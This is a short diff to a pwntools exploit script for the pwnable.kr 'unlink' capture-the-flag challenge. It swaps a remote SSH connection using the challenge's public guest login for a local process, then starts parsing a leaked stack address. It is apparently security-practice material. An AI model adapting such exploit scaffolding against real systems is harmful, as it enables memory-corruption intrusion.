@@ -1,7 +1,6 @@
 from pwn import *
 
-con = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
-p = con.process('./unlink')
+p = process('./unlink')
 
 p.recvuntil('stack address leak: ')
 stack_addr = int(p.recvline()[2:], 16)
